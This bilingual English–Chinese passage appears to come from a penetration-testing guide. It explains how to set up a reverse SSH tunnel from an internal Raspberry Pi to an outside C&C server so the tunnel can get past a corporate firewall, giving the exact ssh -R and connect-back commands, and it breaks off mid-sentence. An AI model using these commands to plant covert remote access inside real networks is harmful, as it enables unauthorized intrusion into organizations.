  ## 设置反向 SSH 隧道


  Now that SSH is working on both hosts, we need to set up the reverse SSH tunnel.
  Taking a look at the following figure showing a simplified topology, there is a
  pretty big problem here that justifies why we need to set up a reverse SSH tunnel:


  现在 SSH 在两个主机上都已正常工作，我们需要设置反向 SSH 隧道。查看以下显示简化拓扑的图，这里有一个相当大的问题，这正好说明了为什么我们需要设置反向 SSH
  隧道：


  ![](img/095df2cd1930baecbcecaa51ee3417aa_67_0.png)


  Do you see it? Well, in case you don''t, the issue is that our internal Raspberry
  Pi server is not reachable externally, since the corporate firewall is blocking
  it. There are no inbound rules or NAT polices in place to handle this sort of connection.
  So I have no issues connecting to the C&C server; however I will need to have the
  C&C server connecting back to the Raspberry Pi. So, how do we do this? Well, this
  is where a reverse SSH tunnel comes in.


  看到了吗？好吧，以防您没看到，问题是我们的内部 Raspberry Pi 服务器无法从外部访问，因为企业防火墙正在阻止它。没有入站规则或 NAT 策略来处理这种连接。因此我连接到
  C&C 服务器没有任何问题；然而我需要让 C&C 服务器连接回 Raspberry Pi。那么，我们如何做到这一点呢？好吧，这就是反向 SSH 隧道发挥作用的地方。


  What a reverse SSH tunnel allows us to do is have a persistent tunnel setup initiated
  from the inside host to the C&C server with the -R flag as well as a predefined
  port. Because of this flag, when you SSH on the C&C server to itself on this predefined
  port, you will piggyback off of that already established tunnel.


  反向 SSH 隧道允许我们使用 -R 标志以及预定义端口从内部主机到 C&C 服务器建立持久隧道。由于此标志，当您在 C&C 服务器上通过此预定义端口 SSH
  到自身时，您将利用该已建立的隧道。


  In the following figure, you can see how the reverse SSH tunnel works to solve our
  issue:


  在下图中，您可以看到反向 SSH 隧道如何解决我们的问题：


  ![](img/095df2cd1930baecbcecaa51ee3417aa_68_0.png)


  Based on the preceding figure, here is my configuration for setting up the reverse
  SSH tunnel:


  根据前面的图示，以下是我的反向 SSH 隧道设置配置：


  - 1. On the Raspberry Pi (my internal box), connect to the outside C&C server with
  the -R flag as well as the port you plan to use as the redirection port:

  - 1. 在 Raspberry Pi（我的内部设备）上，使用 -R 标志以及您计划用作重定向端口的端口连接到外部 C&C 服务器：


  ```

  ssh -R 8022:localhost:22 mycancserver.mydomain.com

  ```


  - 2. Now, to reference this tunnel on the C&C server, you will just run this command
  and will be seamlessly connected to your internal server without any firewalls or
  NAT rules added.

  - 2. 现在，要在 C&C 服务器上引用此隧道，您只需运行此命令，即可在不添加任何防火墙或 NAT 规则的情况下无缝连接到您的内部服务器。


  ```

  ssh -p 8022 localhost

  ```


  Everything works as tested, great! However, we are not quite done yet. There is
  one more catch. What happens if your Raspberry Pi reboots? You will have to console
